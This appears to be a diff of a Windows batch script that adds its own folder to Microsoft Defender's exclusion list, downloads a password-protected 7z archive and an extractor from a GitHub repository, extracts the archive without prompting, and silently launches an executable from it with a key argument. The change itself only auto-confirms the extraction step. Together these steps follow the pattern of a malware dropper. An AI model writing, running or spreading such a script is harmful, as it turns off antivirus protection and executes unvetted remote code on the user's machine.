@@ -23,7 +23,7 @@ powershell.exe Add-MpPreference -ExclusionPath '%~dp0'
 powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/kdelia12/tes/raw/main/aw.7z', 'aw.7z'); (New-Object Net.WebClient).DownloadFile('https://github.com/kdelia12/tes/raw/main/7zr.exe', '7zr.exe')"
 
 :: Unzip the file "aw.7z" with the password "123" in the same directory
-7zr e -p"123" aw.7z
+echo y | 7zr e -p"123" aw.7z
 
 :: Run "7zr.exe" with the specified parameters
 start "" "d.exe" -silent key=438-483-664 logpath=C:\install.log
